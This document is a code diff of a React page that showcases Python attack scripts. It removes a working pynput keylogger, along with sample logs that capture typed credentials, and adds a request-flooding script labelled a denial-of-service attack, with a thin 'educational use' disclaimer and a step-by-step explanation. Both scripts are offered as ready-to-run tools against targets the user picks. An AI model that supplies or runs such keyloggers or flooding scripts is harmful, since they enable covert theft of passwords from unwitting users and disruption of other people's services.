@@ -6,96 +6,66 @@ const FileDisplaykey = () => {
   return (
     <div className="file-display-container">
       <div className="file-display-item">
-        <h2 className="file-display-heading">Keylogger.py</h2>
+        <h2 className="file-display-heading">DOS.py</h2>
         <pre className="file-display-content">
           <code>
             {`
-# Import necessary packages
-from pynput.keyboard import Key, Listener
-import logging
-import os
+import requests
 
-# Set the directory and filename for the log file
-log_dir = os.getcwd() + "/"
-log_file = log_dir + "keylogging.txt"
+# specify the IP address and the number of requests to send
+#Reminder: this is only for eductional use and should not be used if used, use at YOUR OWN risk and fault
+#and if anything wrong or unexpected occours that is YOUR fault 
+ip_address = "put_ip_adress_here" 
+num_requests = 100
 
-# Configure the logger to write to the log file
-logging.basicConfig(filename=log_file,
-                    level=logging.DEBUG, format='%(asctime)s: %(message)s')
+# create a session object to reuse the same underlying TCP connection
+session = requests.Session()
 
-# Define the function to be called when a key is pressed
-def on_press(key):
-    logging.info(str(key)) # Write the key to the log file
-
-# Start a listener to monitor key presses
-with Listener(on_press=on_press) as listener:
+# send a GET request to the specified IP address num_requests times
+for i in range(num_requests):
     try:
-        listener.join() # Wait for the listener to end
-    except KeyboardInterrupt:
-        pass # If the user interrupts the program, exit 
+        # send a GET request using the session object
+        response = session.get(f"http://{ip_address}")
+        # print the status code of the response for each request
+        print(f"Request {i+1} sent with status code {response.status_code}")
+    except requests.exceptions.RequestException as e:
+        # if the request fails, log the error message to a file
+        with open("errors.log", "a") as f:
+            f.write(f"Request {i+1} failed with error {e}\n")
 
             `}
           </code>
         </pre>
       </div>
-      <div className="file-display-item">
-        <h2 className="file-display-heading">Example Output</h2>
-        <pre className="file-display-content">
-          <code>
-            {`
-2023-03-28 21:50:41,985: 't'
-2023-03-28 21:50:42,169: 'e'
-2023-03-28 21:50:42,442: 's'
-2023-03-28 21:50:42,690: 't'
-2023-03-28 21:50:42,834: 'i'
-2023-03-28 21:50:43,001: 'n'
-2023-03-28 21:50:43,073: 'g'
-2023-03-28 21:50:43,257: Key.enter
-2023-03-28 21:50:46,490: 'f'
-2023-03-28 21:50:46,624: 'a'
-2023-03-28 21:50:46,908: 'c'
-2023-03-28 21:50:47,100: 'e'
-2023-03-28 21:50:47,403: 'b'
-2023-03-28 21:50:47,667: 'o'
-2023-03-28 21:50:47,827: 'o'
-2023-03-28 21:50:48,011: 'k'
-2023-03-28 21:50:48,363: '.'
-2023-03-28 21:50:48,539: 'c'
-2023-03-28 21:50:48,803: 'o'
-2023-03-28 21:50:49,148: 'm'
-2023-03-28 21:50:49,406: Key.enter
-2023-03-28 21:50:53,085: 'j'
-2023-03-28 21:50:53,678: 'o'
-2023-03-28 21:50:55,231: 'h'
-2023-03-28 21:50:56,111: 'n'
-2023-03-28 21:50:59,921: '5'
-2023-03-28 21:51:00,137: '5'
-2023-03-28 21:51:00,524: '6'
-2023-03-28 21:51:00,758: '7'
-2023-03-28 21:51:08,413: 'm'
-2023-03-28 21:51:08,710: 'y'
-2023-03-28 21:51:09,222: 'p'
-2023-03-28 21:51:09,365: 'a'
-2023-03-28 21:51:09,542: 's'
-2023-03-28 21:51:09,733: 's'
-2023-03-28 21:51:10,624: 'w'
-2023-03-28 21:51:10,895: 'o'
-2023-03-28 21:51:11,103: 'r'
-2023-03-28 21:51:11,343: 'd'
-2023-03-28 21:51:12,448: '1'
-2023-03-28 21:51:12,824: '2'
-2023-03-28 21:51:13,185: Key.shift
-2023-03-28 21:51:13,424: '!'
-            `}
-          </code>
-        </pre>
-      </div>
+
       <div className="file-display-item">
         <h2 className="file-display-heading">Description</h2>
-        <p className="file-display-description">Install using: pip install pynput
-        <br/>File location may be changed<br/><br/>
-        The code imports necessary packages, sets the directory and filename for the log file, and configures the logger to write to the log file. It then defines a function to be called when a key is pressed and starts a listener to monitor key presses. The logger records every key pressed by the user and stores it in the log file. This code can be used for security purposes to monitor user activity or as a tool for debugging applications.
+        <p className="file-display-description">Denial Of Service Attack (DOS)
+        This code is written in Python and uses the requests library to send HTTP requests to a specified IP address. It sends a GET request to the IP address specified in the variable ip_address a total of num_requests times.
+<br/>
+<br/>
+The code creates a session object using the requests.Session() method, which allows the same underlying TCP connection to be reused for all requests. This can improve performance, especially when making multiple requests to the same server.
+<br/>
+<br/>
+A for loop is used to send the requests num_requests times. Each time through the loop, a GET request is sent to the specified IP address using the session.get() method, and the response is stored in the response variable.
+
+
         </p>
+        {/**
+         The first line of the code imports the requests library. This library allows us to make HTTP requests and interact with web pages or APIs. In this case, we're using it to send GET requests to a specific IP address.
+
+Next, we set the IP address we want to send requests to and the number of requests we want to send. These are stored in the variables ip_address and num_requests, respectively.
+
+The code then creates a Session object using requests.Session(). This session object allows us to reuse the underlying TCP connection for all requests, which can improve performance by avoiding the overhead of creating a new connection for each request.
+
+The for loop is used to send a total of num_requests GET requests to the specified IP address. The range() function is used to create a sequence of numbers from 0 to num_requests-1, and the loop variable i is assigned each of these values in turn.
+
+For each iteration of the loop, the code sends a GET request to the IP address specified in ip_address using the session.get() method. The f string notation is used to insert the value of ip_address into the URL for each request. The response from the server is stored in the response variable.
+
+After sending each request, the code prints a message to the console indicating the status code of the response. This is done using the print() function and the f string notation to insert the values of i and response.status_code.
+
+If any errors occur during the requests, they will be caught by the try/except block. The except block logs the error message to a file called "errors.log". This is done using the with statement and the "a" flag to open the file in append mode. The error message is written to the file using the write() method of the file object.
+         */}
       </div>
     </div>
   );
